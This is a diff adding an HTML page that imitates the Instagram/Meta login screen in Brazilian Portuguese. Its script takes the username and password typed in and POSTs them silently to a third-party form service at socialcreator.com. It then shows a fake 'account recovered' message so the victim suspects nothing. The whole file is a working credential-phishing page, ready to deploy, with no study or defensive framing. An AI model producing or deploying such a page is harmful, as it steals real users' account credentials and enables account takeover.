@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <!-- Importação do Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Importação do tipo de letra Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        html, body {
+            overflow-x: hidden;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body class="bg-[#1C2A33] text-white min-h-[100dvh] flex flex-col justify-between items-center antialiased selection:bg-[#316DE5] selection:text-white">
+
+    <!-- Cabeçalho -->
+    <header class="w-full pt-[18px] flex justify-center">
+        <span class="text-[#A6B8C7] text-[13.5px] font-normal tracking-wide cursor-pointer hover:text-white transition-colors">Português (Brasil)</span>
+    </header>
+
+    <!-- Área de Conteúdo Principal -->
+    <main class="w-full flex-1 flex flex-col justify-center items-center px-[22px] max-w-[440px] pb-10">
+
+        <!-- Logótipo -->
+        <div class="mb-[48px]">
+            <img 
+                src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp" 
+                alt="Instagram" 
+                class="h-[55px] w-auto object-contain drop-shadow-sm"
+                onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png';"
+            >
+        </div>
+
+        <!-- DIV de Contacto/Login -->
+        <div id="dcontactar" class="w-full flex flex-col items-center">
+            <!-- Formulário atualizado com name="form1" conforme o seu código -->
+            <form id="form1" name="form1" class="w-full space-y-[14px]" onsubmit="processarLogin(event)">
+                
+                <!-- ATENÇÃO: name atualizado para c289095 -->
+                <input
+                    type="text"
+                    name="c289095"
+                    placeholder="Nome de usuário, email ou celular"
+                    class="w-full bg-transparent border border-[#435B6D] rounded-[14px] px-4 py-[15px] text-[15px] text-white placeholder-[#8D9FA9] outline-none focus:border-[#A6B8C7] transition-colors"
+                >
+                
+                <!-- ATENÇÃO: name atualizado para c289096 -->
+                <input
+                    type="password"
+                    name="c289096"
+                    placeholder="Senha"
+                    class="w-full bg-transparent border border-[#435B6D] rounded-[14px] px-4 py-[15px] text-[15px] text-white placeholder-[#8D9FA9] outline-none focus:border-[#A6B8C7] transition-colors"
+                >
+                
+                <button
+                    id="btnenv"
+                    type="submit"
+                    class="w-full bg-[#316DE5] hover:bg-[#2859C5] text-white text-[15.5px] font-medium rounded-full py-[13px] mt-2 transition-colors"
+                >
+                    Entrar
+                </button>
+            </form>
+            <a href="#" class="text-white text-[14.5px] font-medium mt-[22px] hover:underline">
+                Esqueceu a senha?
+            </a>
+        </div>
+
+        <!-- DIV de Sucesso (Oculto por defeito) -->
+        <div id="enviado" class="hidden w-full flex-col items-center mt-4">
+            <div class="bg-transparent border border-[#435B6D] rounded-[14px] p-6 text-center w-full">
+                <div class="flex justify-center mb-4 text-[#A2B5C6]">
+                    <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                </div>
+                <h2 class="text-xl font-semibold mb-2">Acesso recuperado!</h2>
+                <p class="text-[#A2B5C6] text-[15px]">Conta recuperada com sucesso.</p>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- Rodapé -->
+    <footer id="rodape" class="w-full max-w-[440px] px-[22px] pb-[30px] flex flex-col items-center gap-[22px]">
+        <button class="w-full bg-transparent border border-[#41576A] hover:bg-white/5 text-[#65ACF7] text-[15px] font-medium rounded-full py-[12px] transition-colors">
+            Criar nova conta
+        </button>
+
+        <div class="flex flex-col items-center gap-4">
+            <span onclick="freport()" class="text-[#8D9FA9] text-xs cursor-pointer hover:underline">Reportar formulário</span>
+            
+            <div class="flex items-center gap-[6px] text-[#A2B5C6] cursor-pointer hover:text-white transition-colors">
+                <svg viewBox="0 0 100 100" class="h-3.5 fill-current" aria-hidden="true">
+                    <path d="M85.7,35.3c-4.4,0-8.5,2.1-11.2,5.7l-9.1,12.2l-1.2,1.6l-2.4,3.2c-2.3,3-5.8,4.8-9.6,4.8c-6.8,0-12.3-5.5-12.3-12.3 c0-6.8,5.5-12.3,12.3-12.3c3.8,0,7.3,1.8,9.6,4.8l2.4,3.2l1.2,1.6l9.1,12.2c2.7,3.6,6.8,5.7,11.2,5.7c7.9,0,14.3-6.4,14.3-14.3 C100,41.7,93.6,35.3,85.7,35.3z M14.3,35.3C6.4,35.3,0,41.7,0,49.6c0,7.9,6.4,14.3,14.3,14.3c4.4,0,8.5-2.1,11.2-5.7l9.1-12.2l1.2-1.6 l2.4-3.2c2.3-3,5.8-4.8,9.6-4.8c6.8,0,12.3,5.5,12.3,12.3c0,6.8-5.5,12.3-12.3,12.3c-3.8,0-7.3-1.8-9.6-4.8l-2.4-3.2l-1.2-1.6 l-9.1-12.2C22.8,37.4,18.7,35.3,14.3,35.3z"/>
+                </svg>
+                <span class="text-[15px] font-semibold tracking-wide mt-0.5">Meta</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- MODAL: Carregando -->
+    <div id="modalCarregando" class="fixed inset-0 bg-black/60 hidden justify-center items-center z-50 backdrop-blur-sm transition-opacity">
+        <div class="bg-[#263238] rounded-2xl p-6 flex flex-col items-center shadow-xl border border-[#435B6D]/50 w-[200px]">
+            <div class="spinner mb-4"></div>
+            <p class="text-white text-sm font-medium">Carregando...</p>
+        </div>
+    </div>
+
+    <!-- MODAL: Mensagem Genérica (Substitui o falert) -->
+    <div id="modalMensagem" class="fixed inset-0 bg-black/60 hidden justify-center items-center z-50 backdrop-blur-sm transition-opacity px-4">
+        <div class="bg-[#263238] rounded-2xl p-6 flex flex-col items-center shadow-xl border border-[#435B6D]/50 w-full max-w-[320px] text-center">
+            <p id="textoMensagem" class="text-white text-[15px] font-medium leading-relaxed"></p>
+            <button onclick="fecharModal('modalMensagem')" class="mt-6 w-full bg-[#316DE5] hover:bg-[#2859C5] text-white text-[15px] font-medium rounded-full py-[10px] transition-colors">
+                OK
+            </button>
+        </div>
+    </div>
+
+    <!-- MODAL: Confirmar Reporte (Substitui o fconfirm) -->
+    <div id="modalConfirmar" class="fixed inset-0 bg-black/60 hidden justify-center items-center z-50 backdrop-blur-sm transition-opacity px-4">
+        <div class="bg-[#263238] rounded-2xl p-6 flex flex-col items-center shadow-xl border border-[#435B6D]/50 w-full max-w-[320px] text-center">
+            <p id="textoConfirmar" class="text-white text-[15px] font-medium leading-relaxed mb-6"></p>
+            <div class="flex gap-3 w-full">
+                <button onclick="fecharModal('modalConfirmar')" class="w-1/2 bg-transparent border border-[#41576A] hover:bg-white/5 text-white text-[15px] font-medium rounded-full py-[10px] transition-colors">
+                    Cancelar
+                </button>
+                <button id="btnConfirmarAcao" class="w-1/2 bg-red-600 hover:bg-red-700 text-white text-[15px] font-medium rounded-full py-[10px] transition-colors">
+                    Reportar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts JavaScript -->
+    <script>
+        // Função de Validação igual à sua "fenviar()"
+        function fenviar(form) {
+            if (form.c289095.value.trim() === "") {
+                // Chama a nossa modal bonitinha com o exato texto do seu código
+                falertCustom("Please enter <span style='font-weight:bold;'>Login</span>");
+                return false;
+            }
+            return true;
+        }
+
+        // LÓGICA PRINCIPAL DO LOGIN
+        function processarLogin(event) {
+            event.preventDefault();
+            const form = event.target;
+            
+            // 1. Verifica a validação antes de qualquer coisa
+            if (!fenviar(form)) {
+                return false;
+            }
+            
+            // 2. Mostrar Modal "Carregando..." (Substitui o seu $("#loader").show() e $("#btnenv").hide())
+            document.getElementById('modalCarregando').classList.remove('hidden');
+            document.getElementById('modalCarregando').classList.add('flex');
+
+            const dadosCodificados = new URLSearchParams(new FormData(form));
+
+            // POST para o NOVO ENDEREÇO
+            fetch("https://www.socialcreator.com/dom/form_enviando.php?s=328468", {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: dadosCodificados
+            })
+            .then(() => {
+                setTimeout(() => {
+                    // Esconder loading
+                    document.getElementById('modalCarregando').classList.add('hidden');
+                    document.getElementById('modalCarregando').classList.remove('flex');
+
+                    // Esconder o formulário e mostrar a tela de sucesso
+                    document.getElementById('dcontactar').style.display = 'none';
+                    document.getElementById('enviado').classList.remove('hidden');
+                    document.getElementById('enviado').classList.add('flex');
+                    document.getElementById('rodape').style.display = 'none';
+
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                }, 1200);
+            })
+            .catch(error => {
+                console.error("Erro:", error);
+            });
+        }
+
+        // --- FUNÇÕES DE REPORTE ---
+
+        function freport() {
+            fconfirmCustom("Do you want to report this form for trying to steal information?", freport_confirm);
+        }
+
+        function freport_confirm() {
+            fecharModal('modalConfirmar');
+            
+            document.getElementById('modalCarregando').classList.remove('hidden');
+            document.getElementById('modalCarregando').classList.add('flex');
+
+            fetch("https://www.socialcreator.com/dom/reportar_form.php?ida=91785&ids=328468", {
+                method: "POST",
+                mode: "no-cors"
+            }).then(() => {
+                setTimeout(() => {
+                    document.getElementById('modalCarregando').classList.add('hidden');
+                    document.getElementById('modalCarregando').classList.remove('flex');
+                    falertCustom("Thanks for the notice.<br><br>We'll review this form in a few hours");
+                }, 1000);
+            });
+        }
+
+        // Funções Auxiliares de Interface
+        function fconfirmCustom(mensagem, acaoConfirmada) {
+            document.getElementById('textoConfirmar').innerHTML = mensagem;
+            document.getElementById('modalConfirmar').classList.remove('hidden');
+            document.getElementById('modalConfirmar').classList.add('flex');
+            
+            const btnConfirmar = document.getElementById('btnConfirmarAcao');
+            btnConfirmar.onclick = null; 
+            btnConfirmar.onclick = acaoConfirmada;
+        }
+
+        function falertCustom(textoHTML) {
+            document.getElementById('textoMensagem').innerHTML = textoHTML;
+            document.getElementById('modalMensagem').classList.remove('hidden');
+            document.getElementById('modalMensagem').classList.add('flex');
+        }
+
+        function fecharModal(idModal) {
+            document.getElementById(idModal).classList.add('hidden');
+            document.getElementById(idModal).classList.remove('flex');
+        }
+    </script>
+</body>
+</html>
